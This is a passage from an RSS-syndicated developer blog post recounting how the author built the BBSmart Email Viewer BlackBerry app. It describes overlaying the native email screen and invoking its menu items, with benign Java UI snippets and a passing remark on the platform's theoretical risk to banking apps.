&lt;p&gt;&lt;strong&gt;This is a very dangerous and powerful&lt;/strong&gt;. Because you could do this from pretty much any global event handlers, it was possible on the BlackBerry to truly build an app that could replace/update/modify any part of any application running on the device &lt;em&gt;at any time&lt;/em&gt;. For example, theoretically, it would have been possible to create a global event handler that triggered regularly and woke up to check if the &quot;HSBC Bank&quot; app was running...and update the value in the &quot;destination bank account&quot; field if the user was on the transfer screen).&lt;/p&gt;
&lt;p&gt;(Sidenote: I later used this ability to wake up regularly to build BBSmart Alarms Pro - a multi-alarm application. You could wake up via with one-minute resolution by registering a &lt;code&gt;RealtimeClockListener&lt;/code&gt; &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Alarms-Pro/blob/master/src/com/bbsmart/pda/blackberry/bbtime/util/AlarmBackgroundListener.java&quot;&gt;[2]&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Anyway, in my case, what I would do is get the underlying email being opened (sent with the original open event), format it, and then push an entirely new screen on to the display stack, essentially sitting on top/hiding the native email display screen which was still open in the background &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/SmartView.java#L186&quot;&gt;[3]&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;pushScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EmailViewScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;formatter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And of course, for my email display, I did a bunch of work to clean up the email contents to &lt;em&gt;ahem&lt;/em&gt; un-fuck it &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/util/EmailFormatter.java&quot;&gt;[4]&lt;/a&gt;, and then finally displayed the email contents in a HTMLField &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/ui/screens/EmailViewScreen.java&quot;&gt;[5]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And when the user did finally close the email, I would pop &lt;em&gt;both&lt;/em&gt; my screen and the old native email screen, so from the user's perspective it was seamless and appeared like the native email screen was never launched:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exitToMessageList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Close this and the previously opened&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// email view screen&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;popScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActiveScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;popScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActiveScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onClose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getScreenBelow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mailScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exitToMessageList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;The magic trick that made it all work - #2&lt;/h2&gt;
&lt;p&gt;So at the end of this process, I now had my email display screen showing instead of the native email display screen. But that still left the problem of how to implement all of the native email functionality that no APIs existed for - like opening attachments to the email, replying, jumping to the next/prev unopened email, etc.&lt;/p&gt;
&lt;p&gt;The key to enabling all this functionality from my own app was the BlackBerry menu. For those unfamiliar with the BlackBerry, there used to be a dedicated physical menu key you could press to bring up an &quot;in-app menu&quot; with all the global and contextual (depending on what was in-focus) menu options.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;BlackBerry Menu&quot; src=&quot;https://www.neilwithdata.com/images/bbsmart-email-viewer/blackberry-menu.png&quot; class=&quot;img-fullsize&quot;/&gt;&lt;/p&gt;
&lt;p&gt;And of course, all these native email menu options existed in the native email application. So once again, leveraging the reference I had already obtained to the native screen, when a user in BBSmart Email Viewer selected &quot;Reply&quot;, I would get the reference to the native screen, from that get the reference to the native screen's menu, and finally &quot;invoke&quot; the corresponding menu item. For example, here's the definition of the &quot;Reply&quot; menu item from BBSmart Email Viewer &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/ui/screens/EmailViewScreen.java#L944&quot;&gt;[6]&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MenuItem&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;replyMenuItem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MenuItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replyMenuItemText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;findDefaultMenuItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reply&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActiveScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getScreenBelow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mailScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;with &lt;code&gt;findDefaultMenuItem&lt;/code&gt; &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/ui/screens/EmailViewScreen.java#L265&quot;&gt;[7]&lt;/a&gt; and &lt;code&gt;mailScreenMenu&lt;/code&gt; &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/ui/screens/EmailViewScreen.java#L153&quot;&gt;[8]&lt;/a&gt; defined as:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MenuItem&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;findDefaultMenuItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_SIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mailScreenMenu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MenuItem&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mailScreenMenu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;mailScreen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUiApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActiveScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mailScreenMenu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mailScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMenu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And voila! With careful management of the native email menu, BBSmart Email Viewer was able to offer all the functionality available in the native email app.&lt;/p&gt;
&lt;h2&gt;And so it goes...&lt;/h2&gt;
&lt;p&gt;Many developers could not figure out how BBSmart Email Viewer worked - I used to get an email every few weeks or so from people asking how the app worked, but of course, I never told anyone. Having said that, some other developers also did work it out and my app was eventually copied (almost verbatim in look, feel, and functionality) by another developer. To make the app a real success then still relied on a lot of grit, late nights, regular updates, marketing, great customer communication, business relationships, and all the usual things you have to do to be successful in business.&lt;/p&gt;
&lt;p&gt;Nonetheless, I still think back and laugh every now and then at this silly little technical trick that changed my life.&lt;/p&gt;
</description>
<pubDate>Mon, 09 Mar 2020 05:53:32 +0000</pubDate>
<dc:creator>nsainsbury</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.neilwithdata.com/how-i-built-bbsmart</dc:identifier>
</item>
</channel>
</rss>